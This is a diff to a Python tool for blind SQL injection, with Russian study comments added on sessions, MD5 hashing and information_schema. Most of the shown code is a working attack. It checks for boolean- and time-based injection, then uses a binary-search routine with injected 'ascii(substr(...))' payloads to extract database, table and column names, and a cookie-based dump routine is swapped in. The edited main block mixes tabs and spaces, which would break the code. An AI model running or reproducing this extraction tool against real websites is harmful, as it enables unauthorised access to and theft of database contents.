@@ -13,13 +13,21 @@ import re
 from urllib import parse
 import time
 
-
-
 chars=string.ascii_uppercase + string.digits
-
-s = requests.Session()
+"""
+Kак только мы собираемся передать персональную информацию на сервер, нам необходимо каким-то образом сделать так, 
+чтобы сервер ассоциировал все наши запросы именно с нами, 
+и в будущем верно определял все исходящие от нас запросы
+Kогда требуется персонализировать запросы от одного клиента, мы будем использовать сессии
+Сессия (session) – это некоторый отрезок во времени, в пределах которого веб-приложение может определять все запросы от одного клиента.
+"""
+s = requests.Session() 
 s.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
 
+"""
+делаем get http запрос и получаем
+result.content -  который выводит содержимое запроса в байтах
+"""
 def http_get(url):
     result = s.get(url)
     return result.content
@@ -33,8 +41,6 @@ def check_injectionBool(url):
         print("Boolean-based SQL injection was detected")
     else:
         print("There is NO Boolean-based SQLi")
-
-
 
 def check_injectionTime(url):
     sleep = 2
@@ -75,18 +81,44 @@ def main():
                 get_db_all_tables(options.url, options.database)
             elif  options.url != None and options.database !=None and options.table != None and options.column == None and options.cookie == None:
                 get_db_tb_all_columns(options.url, options.database, options.table)
-            elif options.url != None and options.database == None and options.table == None and options.column == None and options.cookie != None:
-                dump(options.url, options.cookie)
+            #elif options.url != None and options.database == None and options.table == None and options.column == None and options.cookie != None:
+            #    dump(options.url, options.cookie)
         else:
             if options.url != None and options.database ==None and options.table == None and options.column == None and options.cookie == None:
                 if check_injectionTime(options.url):
                     get_database(options.url)
                     get_tables_number(options.url)
                     get_tables(options.url)
-
-
-def get_all_databases(url):
-	db_nums_payload = "select count(schema_name) from information_schema.schemata"
+	    elif options.url != None and options.database == None and options.table == None and options.column == None and options.cookie != None:
+                dumpTime(options.url, options.cookie)
+		
+"""
+(1) Получаем число баз данных и их количество
+Формируем payload, в котором считаем количество баз данных 
+Функция COUNT (*) возвращает количество строк в указанной таблице с учетом повторяющихся строк. Она подсчитывает каждую строку отдельно. 
+При этом учитываются и строки, содержащие значения NULL.
+INFORMATION_SCHEMA база данных в пределах каждого экземпляра MySQL, место, которое хранит информацию обо всех других базах данных, которые поддерживает сервер MySQL. 
+INFORMATION_SCHEMA содержит несколько таблиц только для чтения. 
+Они фактически представления, не базовые таблицы, таким образом нет никаких файлов, 
+связанных с ними, и Вы не можете установить триггеры на них. 
+Кроме того, нет никакого каталога базы данных с этим именем.
+The INFORMATION_SCHEMA SCHEMATA Table
+A schema is a database, so the SCHEMATA table provides information about databases.
+The SCHEMATA table has these columns:
+CATALOG_NAME
+The name of the catalog to which the schema belongs. This value is always def. <- то что я использую
+SCHEMA_NAME 
+The name of the schema.
+DEFAULT_CHARACTER_SET_NAME
+The schema default character set.
+DEFAULT_COLLATION_NAME
+The schema default collation
+SQL_PATH
+This value is always NULL.
+DEFAULT_ENCRYPTION
+"""
+def get_all_databases(url): # (1)
+	db_nums_payload = "select count(schema_name) from information_schema.schemata" 
 	db_numbers = half(url, db_nums_payload)
 	print("The total number of databases is: %d"% db_numbers)
 	for x in range(db_numbers):
@@ -99,9 +131,6 @@ def get_all_databases(url):
 		 	db_name += chr(half(url,db_name_payload))
 
 		print("The %d database is: %s"% (x+1, db_name))
-
-
-
 
 def get_db_all_tables(url,database):
     tb_nums_payload = "select count(table_name) from information_schema.tables where table_schema = '%s'" % database
@@ -135,31 +164,37 @@ def get_db_tb_all_columns(url,database,table):
             co_name_payload = "ascii(substr((select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %d,1),%d,1))" % (database,table,x,y)
             co_name += chr(half(url,co_name_payload))
             print(database,"in the database",table,"the name of the %d field in the table: %s"% (x+1,co_name))
-
+"""
+md5 используется для хеширования данных
+"""
 def md5(str):
     hl = hashlib.md5()
     hl.update(str)
     return hl.hexdigest()
-
+"""
+(1) Хэшируем result.content, который выводит содержимое запроса в байтах, 
+и получаем безопасный хеш(дайджест), возвращаемый, 
+как строковый объект двойной длины, содержащий только шестнадцатеричные цифры.
+"""
 def half(url,payload):
     low = 0
     high = 126
-    standard_html = md5(http_get(url))
+    standard_html = md5(http_get(url)) # (1)
     #print(standard_html)
     while low <= high:
         mid=(low + high)/2
-        mid_num_payload = url + " and (%s) > %d-- " % (payload,mid)
+        mid_num_payload = url + " and (%s) > %d-- " % (payload,mid) # берем середину mid и сравниваем с payload
         #print(mid_num_payload)
         mid_html = md5(http_get(mid_num_payload))
         #print(mid_html)
-        if mid_html == standard_html:
+        if mid_html == standard_html: # сужаем диапазон в теле if
             low = mid + 1
         else:
             high = mid - 1 
     mid_num = int((low+high+1)/2)
     return mid_num
 
-def dump(url, TrackingId):
+def dumpTime(url, TrackingId):
     queries = [
         "SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()",
         "SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='{}'",
